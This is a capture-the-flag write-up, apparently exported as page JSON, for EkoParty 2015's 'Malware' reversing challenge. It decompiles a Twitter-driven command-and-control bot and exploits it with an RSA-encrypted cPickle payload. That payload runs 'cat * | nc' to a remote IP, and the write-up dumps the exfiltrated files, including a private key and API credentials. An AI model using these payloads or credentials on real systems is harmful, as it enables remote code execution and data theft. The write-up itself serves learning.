{"pageContext":{"html":"<p><a href=\"ctf=ekoparty-ctf-2015\"></a>\n<a href=\"type=reversing\"></a>\n<a href=\"tags=malware,control,pickle,RSA\"></a>\n<a href=\"tools=Twitter,easy-python-decompiler\"></a>\n<a href=\"techniques=Decompiling\"></a></p>\n<h1>Malware (rev-200)</h1>\n<p>We have a <a href=\"/rev200-5d0cf6207fa5d23f2e8ab7215ea634d1.zip\">zip</a>.\nExtract and we get</p>\n<p><code>bash $ file ekobot_final.pyc ekobot_final.pyc: python 2.7 byte-compiled</code></p>\n<p>Byte-compiled python can be very easily decompiled. So here I use <a href=\"http://sourceforge.net/projects/easypythondecompiler/\">Easy Python Decompiler</a>. We get an <a href=\"/ekobot_final-b793de9c6a68dc9e788023f39fd77f1d.py\">output</a> which is scary!</p>\n<p>`<code></code>python</p>\n<h1>Embedded file name: ekobot_final.py</h1>\n<p>import os\nimport sys\nimport httplib2\nimport cPickle\nfrom Crypto.PublicKey import RSA\nfrom base64 import b64decode\nfrom twython import Twython\nif 0:\ni11iIiiIii\nOO0o = 'ekoctf'\nif 0:\nIii1I1 + OO0O0O % iiiii % ii1I - ooO0OO000o\nif len(sys.argv) != 2:\nos._exit(0)\nif 0:\nIiII1IiiIiI1 / iIiiiI1IiI1I1\no0OoOoOO00 = sys.argv[1]\nif 0:\nOOOo0 / Oo - Ooo00oOo00o.I1IiI\no0OOO = 'ienmDwTNHZVR9si4SzeCg1glB'\niIiiiI = 'TTlOJrwq5o9obnRyQXRyaOkRoYUBTrCzN9j9IHX0Bc4dS2xBHN'\nif 0:\niii1II11ii * i11iII1iiI + iI1Ii11111iIi + ii1II11I1ii1I + oO0o0ooO0 - iiIIIII1i1iI</p>\n<p>def o0oO0():\noo00 = 0\nif os.path.isfile(o0OoOoOO00):\ntry:\no00 = open(o0OoOoOO00, 'r')\noo00 = int(o00.readline(), 10)\nexcept:\noo00 = 0</p>\n<pre><code>return oo00\nif 0:\n    II1ii - o0oOoO00o.ooO0OO000o + ii1II11I1ii1I.ooO0OO000o - iI1Ii11111iIi\n</code></pre>\n<p>def oo(twid):\ntry:\no00 = open(o0OoOoOO00, 'w')\no00.write(str(twid))\nexcept:\nif 0:\noO0o0ooO0 - OO0O0O - IiII1IiiIiI1.ii1II11I1ii1I * iiIIIII1i1iI * ii1I\nif 0:\nii1II11I1ii1I</p>\n<p>def oo00000o0(url):\nI11i1i11i1I = httplib2.Http('')\nIiii, OOO0O = I11i1i11i1I.request(url, 'GET')\nif Iiii.status == 200:\ntry:\nif Iiii['content-type'][0:10] == 'text/plain':\nreturn OOO0O\nreturn 'Err'\nexcept:\nreturn 'Err'</p>\n<pre><code>else:\n    return url\n    if 0:\n        o0oOoO00o\n</code></pre>\n<p>def IiI1i(cipher<em>text):\ntry:\nOOo0o0 = RSA.importKey(open('ekobot.pem').read())\nO0OoOoo00o = b64decode(cipher</em>text)\niiiI11 = OOo0o0.decrypt(O0OoOoo00o)\nreturn iiiI11\nexcept Exception as OOooO:\nprint str(OOooO)\nreturn 'Err'\nif 0:\nOOOo0 + Oo / ii1II11I1ii1I * iiiii</p>\n<p>II111iiii = Twython(o0OOO, iIiiiI, oauth<em>version=2)\nII = II111iiii.obtain</em>access<em>token()\nII111iiii = Twython(o0OOO, access</em>token=II)\nif 0:\nOo % ii1I\noo00 = o0oO0()\no0oOo0Ooo0O = II111iiii.search(q='#' + OO0o, rpp='250', result<em>type='mixed', since</em>id=oo00)\nif 0:\nI1IiI * iiIIIII1i1iI * iI1Ii11111iIi - oO0o0ooO0 - Ooo00oOo00o\nfor OooO0OO in o0oOo0Ooo0O['statuses']:\nif OooO0OO['id'] > oo00:\noo00 = OooO0OO['id']\nif 0:\nooO0OO000o\niii11iII = 0\ntry:\nfor i1I111I in OooO0OO['entities']['hashtags']:\nif i1I111I['text'] == OO0o:\niii11iII = 1</p>\n<pre><code>    if iii11iII == 1:\n        for i11I1IIiiIi in OooO0OO['entities']['urls']:\n            if os.fork() == 0:\n                IiIiIi = IiI1i(oo00000o0(i11I1IIiiIi['url']))\n                if IiIiIi[0:5] == 'eko11':\n                    cPickle.loads(IiIiIi[5:])\n                os._exit(0)\n                if 0:\n                    iii1II11ii.Oo.iIiiiI1IiI1I1.ii1I\n\nexcept Exception as OOooO:\n    print str(OOooO)\n    if 0:\n        ii1II11I1ii1I + ooO0OO000o % i11iIiiIii.o0oOoO00o - IiII1IiiIiI1\n</code></pre>\n<p>oo(oo00)\n<code>I scroll though the code and rename variables to make it more readable and easy to debug. [Final](ekobot-chall.py)</code>python\nimport os\nimport sys\nimport httplib2\nimport cPickle\nfrom Crypto.PublicKey import RSA\nfrom base64 import b64decode\nfrom twython import Twython\nname = 'ekoctf'</p>\n<p>if len(sys.argv) != 2:\nos.<em>exit(0)\nif 0:\nIiII1IiiIiI1 / iIiiiI1IiI1I1\nargv</em>1 = sys.argv[1]\nSecret = 'ienmDwTNHZVR9si4SzeCg1glB'\nkey = 'TTlOJrwq5o9obnRyQXRyaOkRoYUBTrCzN9j9IHX0Bc4dS2xBHN'\nprint \"Here!\"\ndef o0oO0():\nmax<em>id = 0\nif os.path.isfile(argv</em>1):\ntry:\no00 = open(argv<em>1, 'r')\nmax</em>id = int(o00.readline(), 10)\nexcept:\nmax_id = 0</p>\n<pre><code>return max_id\n</code></pre>\n<p>def save<em>new</em>max(twid):\ntry:\no00 = open(argv_1, 'w')\no00.write(str(twid))\nexcept:\nprint error</p>\n<p>def get_content(url):\nprint url\nI11i1i11i1I = httplib2.Http('')\nIiii, OOO0O = I11i1i11i1I.request(url, 'GET')\nif Iiii.status == 200:\ntry:\nif Iiii['content-type'][0:10] == 'text/plain':\nreturn OOO0O\nreturn 'Err'\nexcept:\nreturn 'Err'</p>\n<pre><code>else:\n    return url\n</code></pre>\n<p>def decrypt(cipher<em>text):\nprint cipher</em>text\nreturn 'err'\ntry:\nOOo0o0 = RSA.importKey(open('ekobot.pem').read())\nO0OoOoo00o = b64decode(cipher<em>text)\niiiI11 = OOo0o0.decrypt(O0OoOoo00o)\nreturn iiiI11\nexcept Exception as OOooO:\nprint str(OOooO)\nreturn 'Err'\ntwython</em>object = Twython(Secret, key, oauth<em>version=2)\naccess</em>token = twython<em>object.obtain</em>access<em>token()\ntwython</em>object = Twython(Secret, access<em>token=access</em>token)\nmax<em>id = o0oO0()\nsearch</em>result = twython<em>object.search(q='#' + name, rpp='250', result</em>type='mixed', since<em>id=max</em>id)</p>\n<p>for i in search<em>result['statuses']:\nprint i['id']\nif i['id'] > max</em>id:\nmax_id = i['id']\niii11iII = 0\ntry:\nfor i1I111I in i['entities']['hashtags']:\nif i1I111I['text'] == name:\niii11iII = 1</p>\n<pre><code>    if iii11iII == 1:\n        for j in i['entities']['urls']:\n            if True:\n                IiIiIi = decrypt(get_content(j['url']))\n                print IiIiIi\n                if IiIiIi[0:5] == 'eko11':\n                    cPickle.loads(IiIiIi[5:])\n                #os._exit(0)\n\nexcept Exception as OOooO:\n    print str(OOooO)\n</code></pre>\n<p>print max_id\n`<code></code>\nNow twython is Python wrapper for the Twitter API. Here first the program is registering itself and then searching for tweets with 'ekoctf' tag. For every tweet it will try to extract a url from it, then visit the url and dowload the content if its 'text\\plain' Content-type. Next this content is decrypted by some private key locally stored. The decrypted plaintext is verified for starting with 'eko11' and the rest is loaded os cPickle.</p>\n<p>cPickle is used to serialize python objects and suffers from code execution on loads().</p>\n<p><code>python cPickle.loads('cos\\nsystem\\n(S'cat /etc/passwd'\\ntR.'\\ntR.')</code>\nIf this service is being run somewhere then we can have code execution on that machine just by Tweeting our commands.\nA nice example of C&#x26;C( command and control ).</p>\n<p>However we would need a public key for encrypting the data. Looking around on twitter we find the <a href=\"/pub-4d09c7c3dfa9d92f853e91510a7ce81a.pem\">key</a> with same hashtag.\nNow we can get the flag by various methods on the machine. We can make a request to a controlled domain with contents of the flag.</p>\n<p>What I did was \"cat * | nc my-machine port\". It will dump the contents of every file to the port which I was listening on my machine.\nA quick RSA encryption\n`<code></code>python\nfrom Crypto.PublicKey import RSA\nfrom base64 import b64decode,b64encode</p>\n<p>key=RSA.importKey(open('pub.pem').read())\nexploit=\"eko11\"+\"cos\\nsystem\\n(S'cat * | nc 182.70.222.238 8000'\\ntR.'\\ntR.\"\ntxt=key.encrypt(exploit,32)[0]\nfinal=b64encode(txt)\nprint final\n<code></code></p>\n<p>We can use pastebin's view-raw url as a link in the tweet and </p>\n<p><code>bash while true ; do nc -l -n -v -p 8000 ; done</code>\non my machine. After some 30-40 seconds\n`<code></code>\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAmWw84H8BSPG1Ispn1hBPWZ4ORxniLhOl76aOAsGsqdRZJyL+\nPFLWedGUx0ELwzf3vWQ2wMDwN37MZYWdS4z8WT6P4FRtK09UtDgqNUQdx49WBqDf\n2GmIT+uBwMQBUCe3x+RTVcwDzA1I0mPtJj3K6bGdmSSBZjgc6MA4rJil7xdSVP5P\nedb8MZMKk/5tXmFl3gFjykkUfG+DbmsxulZ48D+IoIU6bVWAkael+ftZtDWY43Xk\nezD2swV01Eaw4J7MzBakPDA6KipxNhKQZ2xoeEsP2p8L67qF48eUbxI1ukcrqdy0\nc92rSihmChGBmHQ2AREshtTTLpM24/Nrirje/QIDAQABAoIBAEF/xyGktxy4LDe1\nJ81o2yeMZdYPA9PeCYqdlaUxoBBFGuatdtK0HuKVCipi562pWDff78ws0qEunf59\no6CciSNkpTIFeTHzRVtHWyWwdfI7jGN6DPasX0iXZ6avR0w8GKbbIITRe5GC3mML\nzDP2T4mjjX/S6PeF3zmyzr9I0BaZOgTdUumuYCzDfA9+MgRxIUi9i+7rrOMTiGdo\nWGJVGC+j8vQiyf5eOGtlQxYLwm2pWas3EYrvk6jiesNhdDvr87X7YW8uABwUlLr5\n5m/vocLCJLpo+QjFdyo6bNd/wEfQs1pG9C0UPIe46YIEeAkY08q2a5xzikfx/CGL\nnsgc/dUCgYEAyynNy9qbUEbgJr6dfksTs2nBu89yG/vy3eoNoUbStr0LCAIYl8kn\nXnwliCuli/5Zssb6/uBqX7fUuD3ztgCmo8KoNjJ/VHh9n701Uwl5FghqeoILnQHI\nCFbN1Ub18VoOLt2SjgKN+7sqqrEiCqyyFxyoCDyBkBOqS7gr0V+/wMMCgYEAwVLQ\nVZb335ovMx20cE8yO200dbwFdlJsYhM0PKSLLJ0aSsymrhFhUZC/rjQ8rJD1zs+W\nlg6QeQ6yQRE4n4egi8NOnMms83kIMGeOa5VvCcQxXJ8v4Vez432SOeRHMxiUmiME\nXHGnulsI9NhKYoMKfvfvLEwptzhCfAr2QO7e5T8CgYEAuFcZFVQowuFcd6tTagmj\nOZLHJ6tl5YBpcPPzJBgID6lePgjw2aC6aSAKShEYZ/sE1pN3oRZtTqaVjAsifE0A\n5uw0BuEw6ateiTd8D/kzdktymfAvq2m3X+GraE630COfZOTFGre0rum4ICMTOU5T\nVWc6DCcihGFjjsrwb00Kx1MCgYAB9KuE4iUZzv6BPuCvbi2s6jroogFQJB9Skq0p\nm+SIjAJTFWTuR+C7KYK26XJfsIu8Dt+QHw+ZGev1uo3fF0kpgM1Pyr6ELApIKxQG\nxJk9+Q0iyb17Qx7fw0pyaXvK6Ym/UXFe2gt/WCJsD7AY9QhrJmj2AsM9RkVt6dJ5\n77CzkwKBgQCk8oTtzfyXzUWcqsiekmHmzDAuO+SH/a0/FP2ceTq0I1caS6OAvYlj\nR9aTJk5P02EmnfWCZVpMhzHlL4zO1x+2PiUiAXOthbyufWt5qyigp6jsNouLqFz0\nOksk+bPu1XDVqT2XpoQtFXyFuJZmaFlA3k2Ny7rGe5bJ8XWCX6E+Bg==\n-----END RSA PRIVATE KEY-----\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmWw84H8BSPG1Ispn1hBP\nWZ4ORxniLhOl76aOAsGsqdRZJyL+PFLWedGUx0ELwzf3vWQ2wMDwN37MZYWdS4z8\nWT6P4FRtK09UtDgqNUQdx49WBqDf2GmIT+uBwMQBUCe3x+RTVcwDzA1I0mPtJj3K\n6bGdmSSBZjgc6MA4rJil7xdSVP5Pedb8MZMKk/5tXmFl3gFjykkUfG+DbmsxulZ4\n8D+IoIU6bVWAkael+ftZtDWY43XkezD2swV01Eaw4J7MzBakPDA6KipxNhKQZ2xo\neEsP2p8L67qF48eUbxI1ukcrqdy0c92rSihmChGBmHQ2AREshtTTLpM24/Nrirje\n/QIDAQAB\n-----END PUBLIC KEY-----</p>\n<h1>/usr/bin/python</h1>\n<p>import os\nimport sys\nimport httplib2\nimport cPickle\nfrom Crypto . PublicKey import RSA\nfrom base64 import b64decode\nfrom twython import Twython\nif 64 - 64: i11iIiiIii\nOO0o = 'ekoctf'\nif 81 - 81: Iii1I1 + OO0O0O % iiiii % ii1I - ooO0OO000o\nif ( len ( sys . argv ) &#x3C;> 2 ) :\nos . <em>exit ( 0 )\nif 4 - 4: IiII1IiiIiI1 / iIiiiI1IiI1I1\no0OoOoOO00 = sys . argv [ 1 ]\nif 27 - 27: OOOo0 / Oo - Ooo00oOo00o . I1IiI\no0OOO = 'ienmDwTNHZVR9si4SzeCg1glB'\niIiiiI = 'TTlOJrwq5o9obnRyQXRyaOkRoYUBTrCzN9j9IHX0Bc4dS2xBHN'\nif 23 - 23: iii1II11ii * i11iII1iiI + iI1Ii11111iIi + ii1II11I1ii1I + oO0o0ooO0 - iiIIIII1i1iI\ndef o0oO0 ( ) :\noo00 = 0\nif os . path . isfile ( o0OoOoOO00 ) :\ntry :\no00 = open ( o0OoOoOO00 , \"r\" )\noo00 = int ( o00 . readline ( ) , 10 )\nexcept :\noo00 = 0\nreturn oo00\nif 62 - 62: II1ii - o0oOoO00o . ooO0OO000o + ii1II11I1ii1I . ooO0OO000o - iI1Ii11111iIi\ndef oo ( twid ) :\ntry :\no00 = open ( o0OoOoOO00 , \"w\" )\no00 . write ( str ( twid ) )\nexcept :\npass\nif 89 - 89: oO0o0ooO0 - OO0O0O - IiII1IiiIiI1 . ii1II11I1ii1I * iiIIIII1i1iI * ii1I\nif 25 - 25: ii1II11I1ii1I\ndef oo00000o0 ( url ) :\nI11i1i11i1I = httplib2 . Http ( \"\" )\nIiii , OOO0O = I11i1i11i1I . request ( url , 'GET' )\nif Iiii . status == 200 :\ntry :\nif Iiii [ \"content-type\" ][ 0 : 10 ] == 'text/plain' :\nreturn OOO0O\nelse :\nreturn 'Err'\nexcept :\nreturn 'Err'\nelse :\nreturn url\nif 94 - 94: o0oOoO00o\ndef IiI1i ( cipher</em>text ) :\ntry :\nOOo0o0 = RSA . importKey ( open ( 'ekobot.pem' ) . read ( ) )\nO0OoOoo00o = b64decode ( cipher<em>text )\niiiI11 = OOo0o0 . decrypt ( O0OoOoo00o )\nreturn iiiI11\nexcept Exception , OOooO :\nprint str ( OOooO )\nreturn 'Err'\nif 58 - 58: OOOo0 + Oo / ii1II11I1ii1I * iiiii\nII111iiii = Twython ( o0OOO , iIiiiI , oauth</em>version = 2 )\nII = II111iiii . obtain<em>access</em>token ( )\nII111iiii = Twython ( o0OOO , access<em>token = II )\nif 63 - 63: Oo % ii1I\noo00 = o0oO0 ( )\no0oOo0Ooo0O = II111iiii . search ( q = '#' + OO0o , rpp = \"250\" , result</em>type = \"mixed\" , since_id = oo00 )\nif 81 - 81: I1IiI * iiIIIII1i1iI * iI1Ii11111iIi - oO0o0ooO0 - Ooo00oOo00o\nfor OooO0OO in o0oOo0Ooo0O [ 'statuses' ] :\nif OooO0OO [ 'id' ] > oo00 :\noo00 = OooO0OO [ 'id' ]\nif 28 - 28: ooO0OO000o\niii11iII = 0\ntry :\nfor i1I111I in OooO0OO [ 'entities' ][ 'hashtags' ] :\nif i1I111I [ 'text' ] == OO0o :\niii11iII = 1\nif iii11iII == 1 :\nfor i11I1IIiiIi in OooO0OO [ 'entities' ][ 'urls' ] :\nif os . fork ( ) == 0 :\nIiIiIi = IiI1i ( oo00000o0 ( i11I1IIiiIi [ 'url' ] ) )\nif IiIiIi [ 0 : 5 ] == 'eko11' :\ncPickle . loads ( IiIiIi [ 5 : ] )\nos . _exit ( 0 )\nif 40 - 40: iii1II11ii . Oo . iIiiiI1IiI1I1 . ii1I\nexcept Exception , OOooO :\nprint str ( OOooO )\nif 33 - 33: ii1II11I1ii1I + ooO0OO000o % i11iIiiIii . o0oOoO00o - IiII1IiiIiI1\noo ( oo00 )</p>\n<h1>dd678faae9ac167bc83abf78e5cb2f3f0688d3a3</h1>\n<p>EKO{simple<em>C&#x26;C</em>RSAtu1ts}\n`<code></code></p>\n<p>Flag:</p>\n<blockquote>\n<p>EKO{simple<em>C&#x26;C</em>RSAtu1ts}</p>\n</blockquote>\n<p>PS: I spent about 10 hours on this chall only because of the API. It never read my tweets. The admin fmunozs was cool and helpful and even used his account to tweet. Cheers man!</p>","relativePath":"writeups/ekoparty-ctf-2015/reversing/Malware/sudhackar"}}